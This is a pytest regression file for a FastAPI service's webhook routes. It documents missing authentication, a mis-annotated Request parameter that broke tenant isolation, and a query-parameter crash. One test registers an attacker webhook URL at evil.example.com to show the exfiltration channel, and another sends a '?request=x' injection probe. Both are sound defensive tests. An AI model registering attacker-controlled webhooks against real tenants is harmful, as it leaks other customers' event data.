"""
`/webhooks/*` must require auth and take its tenant from the API key.

Three compounding defects, all confirmed against production 2026-07-29:

  1. No authentication. `GET /webhooks/` and `GET /webhooks/events` returned 200
     anonymously; `POST /` (register a webhook URL) was equally open, which is a
     data-exfiltration channel.
  2. Handlers declared `request: Any = None`. FastAPI does not inject a Request
     for an `Any`-annotated parameter with a default — it publishes it as a
     QUERY parameter. The Request was therefore always None, the tenant helper
     never ran, and every caller resolved to the "default" tenant: no
     cross-tenant isolation at all.
  3. As a query parameter, `?request=x` reached `_tenant("x")`, which did
     `.headers` on a str → AttributeError → HTTP 500.

Even had (2) worked, an X-Tenant-ID header on an unauthenticated route is
caller-controlled identity. The tenant now comes from `AuthResult.tenant_id`.
"""

from __future__ import annotations

import pytest


@pytest.fixture
def _authed_client(monkeypatch):
    """Auth genuinely enabled; patch module globals rather than reloading —
    modules bind `require_api_key` by value at import."""
    import warden.auth_guard as ag

    monkeypatch.setattr(ag, "_VALID_KEY", "wh-test-key", raising=False)
    monkeypatch.setattr(ag, "_KEYS_PATH", "", raising=False)

    from fastapi.testclient import TestClient

    import warden.main as m

    return TestClient(m.app)


_READ = ["/webhooks/", "/webhooks/events", "/webhooks/some-id/history"]


@pytest.mark.parametrize("path", _READ)
def test_read_routes_require_auth(_authed_client, path):
    assert _authed_client.get(path).status_code == 401, f"{path} served anonymously"


def test_create_requires_auth(_authed_client):
    """The registration endpoint is the exfiltration risk: an attacker-controlled
    URL registered against someone else's tenant receives their events."""
    resp = _authed_client.post(
        "/webhooks/",
        json={"url": "https://evil.example.com/x", "secret": "s", "events": ["filter.blocked"]},
    )
    assert resp.status_code == 401


def test_delete_and_test_require_auth(_authed_client):
    assert _authed_client.delete("/webhooks/some-id").status_code == 401
    assert _authed_client.post("/webhooks/test/some-id").status_code == 401


def test_request_is_not_a_query_parameter():
    """
    Regression guard for defect (2)/(3).

    `request: Any = None` made FastAPI publish `request` as a query parameter,
    which both broke tenant resolution and turned `?request=x` into a 500.
    """
    import warden.main as m

    spec = m.app.openapi()
    for path in ("/webhooks/", "/webhooks/{endpoint_id}"):
        for op in spec["paths"].get(path, {}).values():
            names = {p["name"] for p in op.get("parameters", [])}
            assert "request" not in names, (
                f"{path} publishes a 'request' query parameter — a Request "
                f"parameter is being shadowed by an Any/default annotation."
            )


def test_query_injection_does_not_500(_authed_client):
    """`?request=x` must not reach a tenant helper as a string."""
    resp = _authed_client.get("/webhooks/?request=x", headers={"X-API-Key": "wh-test-key"})
    assert resp.status_code != 500, "an unexpected query parameter still crashes the handler"


def test_tenant_comes_from_the_key_not_a_header(_authed_client):
    """A caller must not be able to select their tenant with X-Tenant-ID."""
    import inspect

    import warden.api.webhooks as wh

    src = inspect.getsource(wh)
    assert 'headers.get("X-Tenant-ID"' not in src, (
        "webhooks resolves tenant from a caller-supplied header again; use "
        "AuthResult.tenant_id, which is derived from the presented key."
    )
    assert "auth.tenant_id" in src


def test_router_declares_the_auth_dependency():
    from warden.api.webhooks import router

    assert router.dependencies, "webhooks router lost its auth dependency"
